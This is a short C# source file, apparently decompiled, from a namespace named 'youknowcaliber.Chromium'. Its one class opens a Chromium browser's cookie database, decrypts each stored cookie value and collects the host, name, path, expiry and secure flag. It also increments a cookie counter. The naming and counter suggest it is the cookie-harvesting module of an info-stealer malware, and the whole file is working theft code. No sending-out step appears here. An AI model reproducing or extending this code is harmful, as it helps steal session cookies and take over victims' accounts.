﻿using System;
using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
	internal sealed class Cookies
	{
		public static List<Cookie> Get(string sCookie)
		{
			List<Cookie> result;
			try
			{
				List<Cookie> list = new List<Cookie>();
				SQLite sqlite = SqlReader.ReadTable(sCookie, "cookies");
				bool flag = sqlite == null;
				if (flag)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Cookie item = default(Cookie);
						item.sValue = Crypto.EasyDecrypt(sCookie, sqlite.GetValue(i, 12));
						bool flag2 = item.sValue == "";
						if (flag2)
						{
							item.sValue = sqlite.GetValue(i, 3);
						}
						item.sHostKey = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sPath = Crypto.GetUTF8(sqlite.GetValue(i, 4));
						item.sExpiresUtc = Crypto.GetUTF8(sqlite.GetValue(i, 5));
						item.sIsSecure = Crypto.GetUTF8(sqlite.GetValue(i, 6).ToUpper());
						Counting.Cookies++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Cookie>();
			}
			return result;
		}
	}
}
